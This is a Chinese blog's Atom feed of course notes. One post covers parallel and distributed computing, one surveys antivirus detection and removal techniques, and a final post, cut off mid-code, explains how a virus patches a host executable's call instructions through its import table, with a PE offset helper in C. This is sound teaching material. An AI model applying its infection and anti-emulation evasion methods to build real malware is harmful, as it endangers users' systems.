<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>江湖</title>
  
  <subtitle>有人的地方就有江湖</subtitle>
  <link href="https://wsw8.online/atom.xml" rel="self"/>
  
  <link href="https://wsw8.online/"/>
  <updated>2021-05-31T12:27:46.106Z</updated>
  <id>https://wsw8.online/</id>
  
  <author>
    <name>汪道之</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>分布式-chapter1</title>
    <link href="https://wsw8.online/archives/7b156417.html"/>
    <id>https://wsw8.online/archives/7b156417.html</id>
    <published>2021-05-27T00:56:41.000Z</published>
    <updated>2021-05-31T12:27:46.106Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是并行计算"><a class="markdownIt-Anchor" href="#什么是并行计算"></a> 什么是并行计算</h2><p>Parallel computing：the use of two or more processors (computers), usually within a single system, working simultaneously to solve a single problem.</p><p>并行计算：使用两个或两个以上的处理器（计算机），通常在一个系统内，同时工作，以解决单个问题。</p><span id="more"></span><p>Distributed computing：any computing that involves multiple computers remote from each other that each have a role in a computation problem or information processing.</p><p>分布式计算：任何涉及多个计算机彼此远程的计算，每个计算机在计算问题或信息处理中都发挥作用。</p><h3 id="什么是并行计算机"><a class="markdownIt-Anchor" href="#什么是并行计算机"></a> 什么是并行计算机</h3><p>并行计算机就是一个支持并行程序的多处理器的计算机系统</p><p>两类并行计算机：</p><ol><li>多机：用多台计算机和互连网络构建起来的并行计算机（通过消息）</li><li>集中多处理器（对称多处理器或SMP）：一个所有CPU共享一个全局内存的更加高度集中的系统（通过全局内存通信和同步）</li></ol><h3 id="并行系统和分布式系统的比较"><a class="markdownIt-Anchor" href="#并行系统和分布式系统的比较"></a> 并行系统和分布式系统的比较</h3><table><thead><tr><th></th><th>并行系统</th><th>分布式系统</th></tr></thead><tbody><tr><td>内存</td><td>紧密耦合共享内存、UMA、NUMA、分布式内存、消息传递</td><td>分布式内存、消息传递、RPC、和/或用于分布式共享内存</td></tr><tr><td>控制</td><td>全局时钟控制、SIMD、MIMD</td><td>没有全局时钟控制、需要同步算法</td></tr><tr><td>进程互连</td><td>按Tbps组织、总线、网格、树、树网、超立方体网络</td><td>按Gbps组织、以太网（总线）、令牌和SCI、以太网（交换网络）</td></tr><tr><td>粒度</td><td>精细</td><td>粗</td></tr><tr><td>可靠性</td><td>假定</td><td>未假定</td></tr><tr><td>主要关注</td><td>性能（时间和规模）、科学计算</td><td>性能（成本和可扩展性）、可靠性/可用性、信息/资源共享</td></tr></tbody></table><h2 id="为什么并行计算"><a class="markdownIt-Anchor" href="#为什么并行计算"></a> 为什么并行计算</h2><h3 id="科技趋势"><a class="markdownIt-Anchor" href="#科技趋势"></a> 科技趋势</h3><p>微处理器计算能力不断提升，摩尔定律：每1.5年每个芯片上晶体管数量翻倍</p><p>但是有诸多限制：</p><ol><li>功率密度限制，由于“立方效应”，并不是越多的晶体管串行处理器的能力就提升越多</li><li>系统架构更改</li><li>芯片收益率限制</li></ol><h3 id="应用程序推动"><a class="markdownIt-Anchor" href="#应用程序推动"></a> 应用程序推动</h3><ol><li>传统实验有很多局限性，利用计算机进行仿真可以克服这些缺点</li><li>科学数据集呈指数增长</li><li>一些特别具有挑战性的计算</li></ol><h2 id="并行计算的问题"><a class="markdownIt-Anchor" href="#并行计算的问题"></a> 并行计算的问题</h2><h3 id="硬件问题"><a class="markdownIt-Anchor" href="#硬件问题"></a> 硬件问题</h3><ol><li>流水线，ILP……</li><li>缓存一致性</li><li>连接问题：单个共享总线与网络</li><li>UMA、NUMA……</li></ol><h3 id="程序模型问题"><a class="markdownIt-Anchor" href="#程序模型问题"></a> 程序模型问题</h3><ol><li>数据共享——单个地址空间与多个地址空间</li><li>过程协调——使用锁、消息、其他方法同步</li><li>分布式与集中式内存</li><li>容错性/可靠性</li></ol><h3 id="性能问题"><a class="markdownIt-Anchor" href="#性能问题"></a> 性能问题</h3><ol><li>指标</li><li>型号</li><li>评估并行算法方法</li></ol><h3 id="其他问题"><a class="markdownIt-Anchor" href="#其他问题"></a> 其他问题</h3><ol><li>并行计算机语言</li><li>并行编程工具</li><li>便携式并行程序</li><li>并行计算机的自动编程</li><li>并行计算机哲学教育</li></ol><h2 id="怎样写并行计算程序"><a class="markdownIt-Anchor" href="#怎样写并行计算程序"></a> 怎样写并行计算程序</h2><p>以n个数的求和为例，我们有p个核，p&lt;&lt;n</p><h3 id="方法一"><a class="markdownIt-Anchor" href="#方法一"></a> 方法一</h3><p>每个核求n/p个数的和，最后把结果发给0号核由其求总和</p><h3 id="改进"><a class="markdownIt-Anchor" href="#改进"></a> 改进</h3><p>让大家一起完成汇总的工作，0号核汇总0号和1号、2号核汇总2号和3号、等等，循环，直到都汇总给0号核</p><p><img src="/images/%E5%88%86%E5%B8%83%E5%BC%8F-chapter1/image-20210531103548461.png" alt="image-20210531103548461" /></p><h3 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h3><p>方法一中，主核心需要完成7次接收和加法；<br />改进后，主核心只需要完成3次接收和加法</p><h3 id="编写并行程序的几个步骤"><a class="markdownIt-Anchor" href="#编写并行程序的几个步骤"></a> 编写并行程序的几个步骤</h3><ol><li><p>任务并行化</p><p>划分各种任务，解决核心问题</p></li><li><p>数据并行化</p><p>将用于解决核心问题的数据进行分区，每个核心都对数据的一部分执行类似的操作</p></li></ol><blockquote><p>核之间需要协调工作</p><ol><li>通信</li><li>负载平衡</li><li>同步</li></ol></blockquote><h3 id="小思考"><a class="markdownIt-Anchor" href="#小思考"></a> 小思考</h3><p>对于n个数求和的并行代码中，如下图，怎么设计my_first_i和my_last_i呢？（假设n可以被p整除）</p><p><img src="/images/%E5%88%86%E5%B8%83%E5%BC%8F-chapter1/image-20210531202147830.png" alt="image-20210531202147830" /></p><p>参考：为了均分，我们肯定是将任务等分成p份，每份计算数的数量n/p，我们假设变量id表示进程（核）id号，范围是0-（p-1），那么my_first_i=id*(n/p)，my_last_i=(id+1)*(n/p)-1。这样分完以后i的范围是0-（n-1）。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是并行计算&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#什么是并行计算&quot;&gt;&lt;/a&gt; 什么是并行计算&lt;/h2&gt;
&lt;p&gt;Parallel computing：the use of two or more processors (computers), usually within a single system, working simultaneously to solve a single problem.&lt;/p&gt;
&lt;p&gt;并行计算：使用两个或两个以上的处理器（计算机），通常在一个系统内，同时工作，以解决单个问题。&lt;/p&gt;</summary>
    
    
    
    <category term="分布式" scheme="https://wsw8.online/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="分布式" scheme="https://wsw8.online/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>病毒_反病毒技术简介</title>
    <link href="https://wsw8.online/archives/c482a079.html"/>
    <id>https://wsw8.online/archives/c482a079.html</id>
    <published>2021-05-20T13:56:28.000Z</published>
    <updated>2021-05-21T01:18:09.819Z</updated>
    
    <content type="html"><![CDATA[<h2 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h2><h3 id="反病毒技术综述"><a class="markdownIt-Anchor" href="#反病毒技术综述"></a> 反病毒技术综述</h3><ol><li><p>第一代反病毒技术</p><p>单纯的病毒特征代码分析，清除染毒文件中的病毒</p></li><li><p>第二代反病毒技术</p><p>静态广谱特征扫描技术，可以检测变形病毒，误报率高</p><span id="more"></span></li><li><p>第三代反病毒技术</p><p>静态扫描技术和动态仿真跟踪技术结合，查找病毒和清除病毒二合一</p></li><li><p>第四代反病毒技术</p><p>基于病毒家族体系的命名规则、基于多位校验和扫描机理、启发式智能代码分析模块、动态数据还原模块、内存解毒模块、自身免疫模块等先进的解毒技术，较好的解决了以前防毒技术顾此失彼、此消彼长的状态，能够较好地完成查毒、解毒的任务</p></li></ol><h3 id="计算机病毒防治技术的划分"><a class="markdownIt-Anchor" href="#计算机病毒防治技术的划分"></a> 计算机病毒防治技术的划分</h3><ol><li>病毒预防，防止病毒进入内存或阻止病毒对磁盘的操作</li><li>病毒检测，计算机病毒的判定</li><li>病毒消除，计算机病毒感染的逆过程，恢复被感染程序原有的结构信息</li><li>病毒免疫，可能并不存在通用的病毒免疫方法</li></ol><h3 id="病毒防治技术从被动到主动"><a class="markdownIt-Anchor" href="#病毒防治技术从被动到主动"></a> 病毒防治技术从被动到主动</h3><ol><li>传统的反病毒技术基于被动式的防御理念，这种理念最大的缺点在于将防治病毒的基础建立在病毒侵入操作系统或网络系统以后，作为上层应用软件的反病毒产品，才能借助于操作系统或网络系统所提供的功能来被动地防治病毒</li><li>主动内核（Active K）技术，是在操作系统和网络的内核中嵌入反病毒功能，使反病毒成为系统本身的底层模块，实现各种反毒模块与操作系统和网络无缝连接，而不是一个系统外部的应用软件。主动内核技术能够实时监控整个系统的运行，并在病毒突破计算机系统软、硬件的瞬间发生作用</li></ol><h3 id="病毒防范的概念"><a class="markdownIt-Anchor" href="#病毒防范的概念"></a> 病毒防范的概念</h3><ol><li>计算机病毒防范，是指通过建立合理的计算机病毒防范体系和制度，及时发现计算机病毒侵入，并采取有效的手段阻止计算机病毒的传播和破坏，恢复受影响的计算机系统和数据</li><li>计算机病毒的防范，就是要在病毒执行之前进行阻断，需要监视、跟踪系统内类似的操作，提供对系统的保护，最大限度地避免各种计算机病毒的传染破坏，往往需要基于全系统的内核级行为监控</li></ol><h3 id="病毒预防措施"><a class="markdownIt-Anchor" href="#病毒预防措施"></a> 病毒预防措施</h3><ol><li><p>勤备份</p><p>及时备份，即使计算机中重要数据遭到计算机病毒的破坏，也可以最大限度的恢复，减少可能的损失。病毒造成的危害有些是不可逆的，因此只能通过备份的方式予以恢复。</p></li><li><p>严防守</p><p>所谓严防守，选择公认最好的反病毒软件、及时安装补丁、在安装新软件前先检测是否含有计算机病毒、尽量不使用软盘，优盘，移动硬盘引导启动等</p></li></ol><h3 id="计算机检测技术分类"><a class="markdownIt-Anchor" href="#计算机检测技术分类"></a> 计算机检测技术分类</h3><ol><li><p>手工检测</p><p>利用Debug、PCTools、SysInfo、WinHex等工具软件进行病毒的检测</p><p>这种方法比较复杂，费时费力，如IceSword</p><p>优点：可以剖析病毒、可以检测一些自动检测工具不能识别的新病毒</p></li><li><p>自动检测</p><p>利用一些专业诊断软件来判断引导扇区、磁盘文件是否有毒的方法</p><p>自动检测比较简单，一般用户都可以进行，但需要较好的诊断软件</p><p>优点：可方便地检测大量的病毒，自动检测工具的发展总是滞后于病毒的发展</p></li></ol><h2 id="常见病毒诊断方法及原理"><a class="markdownIt-Anchor" href="#常见病毒诊断方法及原理"></a> 常见病毒诊断方法及原理</h2><h3 id="比较诊断法"><a class="markdownIt-Anchor" href="#比较诊断法"></a> 比较诊断法</h3><p>原理：用原始的正常备份与被检测的内容(引导扇区或被检测的文件)进行比较</p><p>常见比较法：长度比较法、内容比较法、内存比较法、中断比较法</p><p>优点：比较法不需要专用的反病毒软件，且可以检测未知病毒</p><p>缺点：</p><ol><li>该方法依赖与未染病毒时的原始系统的备份</li></ol><ul><li>且无法知道病毒的种类名称</li><li>易于误报：由于某些病毒并不会导致长度变化，则使用长度比较法会发生漏报，而一些非病毒的操作同样可能改变文件或引导区的长度、内容等</li></ul><h3 id="校验和诊断法"><a class="markdownIt-Anchor" href="#校验和诊断法"></a> 校验和诊断法</h3><p>原理：根据正常文件的信息(如文件名称、大小、时间、日期及内容)，计算其校验和（checksum），计算新的校验和与原来保存的校验和是否一致（校验和被广泛应用在通信领域，用来保证数据的完整性和准确性）</p><p>三种方式：</p><ol><li>对被查的对象文件计算其正常状态的校验和，将校验和值写入被查文件中或检测工具中，而后进行比较</li><li>在应用程序中，放入校验和法自我检查功能，实现应用程序的自检测</li><li>将校验和检查程序常驻内存，每当应用程序开始运行时，自动比较检查应用程序内部或其他文件中预先保存的校验和</li></ol><p>优点：校验和法既能发现已知病毒，也能发现未知病毒</p><p>缺点：不能识别病毒种类与名称，对某些对文件信息影响不大的病毒效果较差，如链式病毒；同比较法一样，病毒感染并不是文件改变的唯一原因，所以此法会产生误报</p><h3 id="扫描诊断法"><a class="markdownIt-Anchor" href="#扫描诊断法"></a> 扫描诊断法</h3><p>原理：扫描法是用每一种病毒体含有的特定病毒码(Virus Pattern)对被检测的对象进行扫描。如果在被检测对象内部发现了某一种特定病毒码，就表明发现了该病毒码所代表的病毒</p><p>两种方式：</p><ol><li>特征代码扫描法</li><li>特征字扫描法</li></ol><p>特定病毒码：当杀毒软件公司收集到新病毒中，就会从病毒程序中截取一小段独一无二且足以标记该病毒的二进制程序码（就好比犯人的指纹）</p><p>扫描法软件包括两部分：</p><ol><li>病毒代码库，库中特征码数量决定了扫描程序的识别能力</li><li>扫描程序</li></ol><p>扫描法是当前最普遍的病毒检测方法</p><p>特征码选择原则：</p><ol><li>具有代表性：小的病毒一百多字节，长的10KB</li><li>不应包含数据区，数据区是可变的</li><li>特征码的长度：过长带来扫码时间和空间的开销过大，过短则不易具有代表性（两个相互矛盾的目标）</li><li>具有区分性：能区别该病毒和其他病毒，更重要的是要能区分病毒和正常程序，避免误报！</li></ol><p>优点：</p><p>使用方便；特征码选择好则误报率低、选择不好则误报率高</p><p>不用专门查毒软件；可识别病毒名称和类别；可做扫毒处理</p><p>缺点：</p><p>特征码的生成难度很大；扫描需要开销；需要不断更新病毒特征码库</p><p>不易识别多态变形病毒、不能检测未知病毒等</p><h3 id="行为监测诊断法"><a class="markdownIt-Anchor" href="#行为监测诊断法"></a> 行为监测诊断法</h3><p>原理：利用病毒的特有行为特性监测病毒的方法，称为行为监测法（人工智能）</p><p>典型行为特征：</p><ol><li>盗用截流系统中断</li><li>导致内存相关信息变化（如内存总量）</li><li>对可执行文件进行写入动作</li><li>写引导扇区或格式化磁盘的可以操作</li><li>搜索API函数地址</li></ol><p>优点：既能发现已知病毒，也能发现未知病毒</p><p>缺点：误报，不能识别病毒名称和种类，需要病毒运行以后才能进行分析</p><h3 id="感染实验诊断法"><a class="markdownIt-Anchor" href="#感染实验诊断法"></a> 感染实验诊断法</h3><p>原理：利用病毒最基本的特征——感染特征，所有病毒都会进行感染，如果不感染，就不称其为病毒</p><p>方法：将正常的文件放入异常的系统中去运行，看这些正常文件是否会被感染，如果被感染，则文件内容会发生变化（通过校验和等检测），则断言系统中存在病毒</p><p>优点：可以发现未知病毒</p><p>缺点：实验开销大，实用性较差</p><h3 id="软件模拟诊断法"><a class="markdownIt-Anchor" href="#软件模拟诊断法"></a> 软件模拟诊断法</h3><p>多态病毒：多态病毒每次感染都变化其病毒代码，对付这种病毒，特征码扫描法失效，我们把使用通常特征码扫描法无法检测（或几乎很难检测）的病毒称之为多态病毒</p><p>多态病毒变换方式：</p><ol><li>采用等价代码对原有代码替换</li><li>改变与执行次序无关的指令的次序</li><li>增加许多垃圾指令</li><li>对原有计算机病毒代码进行加密等</li></ol><p>特征：多态病毒的病毒代码实施密码化，且每次所使用密钥不同，比较多个感染同一病毒的多个文件中的病毒代码，也难以找到相同的可以作为特征码的稳定代码，多态病毒的多态性通常表现在病毒代码和病毒行为的不固定性。但是，每一个多态病毒在执行时都需要还原，如先执行一段解密代码进行解密，再执行解密后的病毒代码。</p><p>原理：软件模拟诊断法就是针对解密后的病毒代码所提出来的一种诊断法，软件模拟（Software Emulation）诊断法又称为解密引擎、虚拟机执行技术或软件仿真技术，它的本质就是一种软件运行时的分析器</p><p>方法：它通过在一个模拟的虚拟环境下运行计算机病毒，等待计算机病毒自身进行解密完成后，再对解密后的病毒代码实施特征码的识别，识别病毒种类后再进行有相关的清除和查杀工作。</p><h3 id="分析诊断法"><a class="markdownIt-Anchor" href="#分析诊断法"></a> 分析诊断法</h3><p>目的：</p><ol><li>确认被观察的引导扇区和程序中是否含有病毒</li><li>确认病毒的类型和种类，判定其是否是一种新病毒</li><li>搞清楚病毒体的大致结构，提取特征识别用的字符串或特征字，并增添到病毒代码库供病毒扫描和识别程序使</li><li>详细分析病毒代码，为制定相应的反病毒措施制定方案</li></ol><h2 id="启发式代码扫描技术"><a class="markdownIt-Anchor" href="#启发式代码扫描技术"></a> 启发式代码扫描技术</h2><p>原理：启发式代码扫描技术基于给定的判断规则和定义的扫描技术，若发现被扫描程序中存在可疑的程序功能指令，则作出存在病毒的预警或判断。</p><p>病毒和正常程序区别：</p><ol><li>正常程序在最初的指令是检查命令行输入有无参数项、清屏和保存原来屏幕显示等</li><li>病毒程序则从来不会这样做，它通常最初的指令是直接写盘操作、跳转、解码指令，或搜索某路径下的可执行程序等相关操作指令序列）</li></ol><p>是一种概率方法：</p><ol><li>可疑程序功能权值定义</li><li>可疑程序报警标准</li><li>可疑功能标志</li></ol><p>缺点：误报</p><p>和传统扫描结合：</p><p><img src="/images/%E7%97%85%E6%AF%92-%E5%8F%8D%E7%97%85%E6%AF%92%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/image-20210521085111002.png" alt="image-20210521085111002" /></p><h2 id="虚拟机查毒技术"><a class="markdownIt-Anchor" href="#虚拟机查毒技术"></a> 虚拟机查毒技术</h2><p>全虚拟化技术：虚拟的操作系统，与底层的硬件完全隔离，完全由中间的Hypervisor层（VMM）完成指令转换和资源映射，典型的代表有Vmware，WorkStation，Microsoft Virtual Server等</p><p>半虚拟化技术：需要在虚拟机的操作系统中加入特定的虚拟化指令（Hypercalls），通过这些加入的指令来调用硬件资源，免除了一部分Hypervisor层转换指令的开销。典型的代表有Xen等。</p><p>原理：虚拟机查毒实际上是自动跟踪病毒入口的解密代码，当其将加密的病毒体按其解密算法进行解密后，就可以得到解密后的病毒明文</p><p>两种方法：</p><ol><li>单步和断点跟踪法（易于发现）</li><li>虚拟执行法（不被发现）</li></ol><p>设计方案：</p><ol><li><p>自含代码虚拟机(SCCE)：SCCE工作起来象一个真正的CPU，每一条取自内存的指令，都由SCCE解码，并被传送到相应的模拟这条指令的例程</p></li><li><p>缓冲代码虚拟机(BCE)：BCE可以看做是SCCE的缩略版，主要进行了特殊指令和非特殊指令的区分，一条指令从内存中取得后，并和一个特殊指令表相比较，如果不是特殊指令，会被导入到一个可以通用地模拟所有非特殊指令的例程，而一小部分的特殊指令，则在特定的例程中进行模拟</p></li><li><p>有限代码虚拟机(LCE)：LCE实际上并非一个虚拟机，因为它并不真正的模拟指令，它只简单地跟踪一段代码的寄存器内容，提供一个小的被改动的内存地址表，或是调用过的中断之类的东西</p></li></ol><p>反虚拟执行技术：</p><ol><li><p>插入特殊指令技术</p><blockquote><p>原理：虚拟机是模拟CPU的执行，并不是真正的CPU，所以不可以能对整个Intel的指令集进行支持，遇到不认识的指令就会停止工作<br />方法：病毒插入特殊指令（如3DNoW），这些指令对病毒本身没有影响，但会干扰虚拟机的工作<br />应对：不需要针对每个特殊指令写专门的模拟函数，只需要构建特殊指令的指令长度表，当EIP指向特殊指令时，就跳过特殊指令长度，或者发现这些特殊指令时，交由CPU去真正执行</p></blockquote></li><li><p>结构化异常处理技术</p><blockquote><p>原理：虚拟机仅仅模拟了CPU的工作过程，而对于异常处理等系统机制没有进行处理，虚拟机会在遇到非法指令、进入异常处理函数前停止工作<br />方法：将解密代码置于自己的异常处理函数，并故意引发异常处理函数<br />应对：为虚拟机赋予发现和记录异常的功能，并在引发异常时将控制转向异常处理函数</p></blockquote></li><li><p>入口点模糊技术（EPO）</p><blockquote><p>原理：即便是虚拟执行，也不可能查找文件的所有代码，虚拟执行通常会在规定步数内，检查待查文件是否具有解密循环，如果没有，就会判定该文件没有携带加密变形病毒，产生漏报<br />方法：病毒在宿主程序执行到某个位置时再获得控制权<br />应对：合理的增加检查的规定步数，如果规定步数较小，极易产生漏报，但规定步数也不能盲目增加，否则会无谓增加检测时间，如何确定规定步数的大小实在是件难事<br />实践上，这类病毒编写技术难度较大，在没有反汇编等工具的帮助下，很难在宿主体内定位一条指令，同时保证超过规定步数，又保证一定会被执行</p></blockquote></li><li><p>多线程技术</p><blockquote><p>虚拟对于模拟启动多线程的工作很难与真实效果一致，多线程切换需要交由下层操作系统负责管理，虚拟机只能在被执行线程独占CPU时间<br />方法：在解密部分入口启动额外线程，使得解密代码在该线程中工作<br />应对：改进虚拟机，支持这些特定的操作系统机制</p></blockquote></li></ol><h2 id="病毒实时监控技术"><a class="markdownIt-Anchor" href="#病毒实时监控技术"></a> 病毒实时监控技术</h2><p>原理：在文件打开、关闭、清除、写入等操作时检查文件是否是病毒携带者，如果是则根据用户的决定选择不同的处理方案，如清除病毒、禁止访问该文件、删除该文件或简单地忽略，从而有效地避免病毒在本地计算机上的感染传播</p><p>难点：</p><ol><li>驱动程序编写难度大</li><li>驱动程序与Ring3下客户程序通信问题</li><li>驱动程序所占资源问题</li></ol><h2 id="病毒的清除"><a class="markdownIt-Anchor" href="#病毒的清除"></a> 病毒的清除</h2><p>引导型病毒感染时常攻击计算机的如下部位：</p><ol><li><p>硬盘主引导扇区</p></li><li><p>硬盘或软盘的BOOT扇区</p></li></ol><p>修复：</p><p>引导型病毒如果将原主引导扇区或BOOT扇区覆盖式写入根目录区，被覆盖的根目录区完全损坏，不可能修复。</p><p>如果引导型病毒将原主引导扇区或BOOT扇区覆盖式写入第一FAT表时，第二FAT表未破坏，则可以修复，可将第FAT表复制到第一FAT表中</p><p>一般而言，引导型病毒占用的其他部分存储空间，采用“坏簇”技术和“文件结束簇”技术占用的空间也需要收回，修改文件分配表即可</p><p>清除.com文件中病毒：</p><ol><li>用Debug调入需清除病毒的文件程序，查找合法程序的程序头</li><li>对于链接于文件头部的计算机病毒，可用合法文件移到文件偏移0100H处，设置CX后存盘的方法清除，debug –w 100会从100开始将CX中指定字节数写入文件</li><li>对于链接于文件尾部的计算机病毒，可以将正常的文件头写入染毒的文件头，并通过设置CX寄存器并存盘的方法去掉程序中的病毒部分</li><li>对内存中的病毒进行清除，病毒程序常驻内存后，一般修改中断向量，所以清除内存中的病毒可以将备份或同版本的中断向量表取代内存中的中断向量表，或直接关掉机器，用干净系统重启</li><li>对于交叉感染或重复感染的.COM文件，一定要找出病毒感染的先后顺序，按从后向前的顺序逐个清除病毒，否则会损坏原文件</li></ol><p>清除.exe文件中病毒：</p><ol><li>清除.EXE文件病毒的方法与清除.COM文件中病毒的方法类似，只不过更繁琐的是恢复原文件头参数</li><li>清除工作仍然要通过仔细分析病毒代码，找到原文件头参数，写回并丢掉病毒程序代码</li><li>由于Debug程序拒绝写.EXE文件，所以在清除.EXE文件中的病毒时应首先将.EXE文件改名，然后再清除</li><li>对于感染PE文件的病毒，可以用PEditor、LordPE等工具软件删除病毒体、恢复程序入口点（正常程序的入口一般是PE文件中的第一个节.text），从而达到清除病毒的目的。若病毒采用了EPO等技术，清除工作将变得异常繁杂</li></ol><h2 id="病毒免疫技术"><a class="markdownIt-Anchor" href="#病毒免疫技术"></a> 病毒免疫技术</h2><ol><li>针对某一种病毒进行的计算机病毒免疫</li></ol><p>优点：是可以有效地防止某一种特定病毒的传染</p><p>缺点：</p><ol><li><p>无法处理不设置感染标识或设置后不能有效判断的病毒</p></li><li><p>病毒变种不再使用这个免疫标志、或出现新病毒时，失去作用</p></li><li><p>某些病毒的免疫标志不容易仿制，若必须加上这种标志，则需对原文件做大的改动，例如大麻病毒；</p></li><li><p>由于病毒的种类较多，不可能对各种病毒都加上免疫标识</p></li><li><p>能阻止传染，却不能阻止病毒的破坏行为，对已中毒文件无能为力</p></li><li><p>基于自我完整性检查的计算机病毒免疫（只用于文件）</p><p>原理：为可执行程序增加一个免疫外壳（1~3KB），同时在免疫外壳中记录有关用于恢复自身的信息。执行具有这种免疫功能的程序时，免疫外壳首先得到运行，检查自身的程序大小、校验和、生成日期和时间等情况，没有发现异常后，再转去执行受保护的程序</p><p>优点：这种方法不只是针对病毒的，由于其他原因造成的文件变化，在大多数情况下免疫外壳程序都能使文件自身得到复原</p><p>缺点：</p><ol><li>每个受到保护的文件都要增加额外的存储空间</li><li>现有一些校验码算法不能满足防病毒需要，无法检查某些病毒感染的文件</li><li>无法对抗覆盖方式的文件型病毒</li><li>有些类型的文件不能使用免疫外壳的防护方法，否则将不能正常执行</li><li>当已被病毒感染的文件也被免疫外壳包裹，妨碍反病毒软件的检测清除</li></ol></li></ol><p><img src="/images/%E7%97%85%E6%AF%92-%E5%8F%8D%E7%97%85%E6%AF%92%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/image-20210521091543540.png" alt="image-20210521091543540" /></p><h2 id="结语"><a class="markdownIt-Anchor" href="#结语"></a> 结语</h2><p>病毒结束啦！考试加油。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h2&gt;
&lt;h3 id=&quot;反病毒技术综述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#反病毒技术综述&quot;&gt;&lt;/a&gt; 反病毒技术综述&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;第一代反病毒技术&lt;/p&gt;
&lt;p&gt;单纯的病毒特征代码分析，清除染毒文件中的病毒&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;第二代反病毒技术&lt;/p&gt;
&lt;p&gt;静态广谱特征扫描技术，可以检测变形病毒，误报率高&lt;/p&gt;</summary>
    
    
    
    <category term="病毒" scheme="https://wsw8.online/categories/%E7%97%85%E6%AF%92/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="病毒" scheme="https://wsw8.online/tags/%E7%97%85%E6%AF%92/"/>
    
  </entry>
  
  <entry>
    <title>病毒_Win_指令Patch实现和重定位表</title>
    <link href="https://wsw8.online/archives/3ad7fb74.html"/>
    <id>https://wsw8.online/archives/3ad7fb74.html</id>
    <published>2021-05-20T11:21:02.000Z</published>
    <updated>2021-05-20T13:55:27.576Z</updated>
    
    <content type="html"><![CDATA[<h2 id="程序实现指令patch"><a class="markdownIt-Anchor" href="#程序实现指令patch"></a> 程序实现指令Patch</h2><h3 id="如何找到需要patch的指令"><a class="markdownIt-Anchor" href="#如何找到需要patch的指令"></a> 如何找到需要Patch的指令</h3><ol><li>首先指定一个会被大概率调用的函数名（也包括函数所在DLL的名字）</li><li>然后通过被寄生文件（exe）的导入表找到该函数的导入表项的地址（即IAT中对应项的地址）</li><li>最后去exe文件的代码中搜索所有可能的Call [xxxx]或JMP [xxxx]，进行Patch</li></ol><span id="more"></span><h3 id="将rva转换为文件位置"><a class="markdownIt-Anchor" href="#将rva转换为文件位置"></a> 将RVA转换为文件位置</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getFileOffsetByRva</span><span class="params">(FILE * fp, <span class="keyword">int</span> sectionNum, <span class="keyword">int</span> rva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   IMAGE_SECTION_HEADER curHdr;   <span class="comment">//定义变量，用来存节头信息</span></span><br><span class="line">   locateNTHdrStart(fp);   <span class="comment">//定位到NT头</span></span><br><span class="line">   fseek(fp, <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS), SEEK_CUR);<span class="comment">//定位到节表</span></span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sectionNum; i++)</span><br><span class="line">   &#123;</span><br><span class="line">      fread(&amp;curHdr, <span class="keyword">sizeof</span>(IMAGE_SECTION_HEADER), <span class="number">1</span>, fp);</span><br><span class="line">      <span class="comment">//判断参数rva在哪个节</span></span><br><span class="line">      <span class="keyword">if</span> ((rva &gt;= curHdr.VirtualAddress) &amp;&amp; </span><br><span class="line">          (rva &lt;= curHdr.VirtualAddress + curHdr.Misc.VirtualSize))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="comment">//返回rva所对应的文件位置   </span></span><br><span class="line">          <span class="keyword">return</span> curHdr.PointerToRawData + (rva - curHdr.VirtualAddress);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//rva不存在任一节中，返回-1</span></span><br><span class="line">   <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="patch指令的函数"><a class="markdownIt-Anchor" href="#patch指令的函数"></a> Patch指令的函数</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 